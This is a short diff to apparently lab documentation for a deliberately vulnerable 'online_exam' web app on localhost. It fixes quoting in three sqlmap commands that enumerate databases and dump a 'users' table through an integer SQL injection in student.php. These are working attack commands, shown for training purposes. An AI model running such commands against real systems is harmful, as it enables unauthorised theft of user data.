@@ -60,9 +60,9 @@ sqlmap -u "http://localhost/online_exam/admin_login.php?username=admin&password=
 Integer injection (student):
 
 ```bash
-sqlmap -u ""http://localhost/online_exam/student.php?id=1"" --dbs --batch --flush-session
-sqlmap -u ""http://localhost/online_exam/student.php?id=1"" -D sqli -T users --columns --batch --flush-session
-sqlmap -u ""http://localhost/online_exam/student.php?id=1"" -D sqli -T users --dump --batch --flush-session
+sqlmap -u "http://localhost/online_exam/student.php?id=1" --dbs --batch --flush-session
+sqlmap -u "http://localhost/online_exam/student.php?id=1" -D sqli -T users --columns --batch --flush-session
+sqlmap -u "http://localhost/online_exam/student.php?id=1" -D sqli -T users --dump --batch --flush-session
 
 ```
 
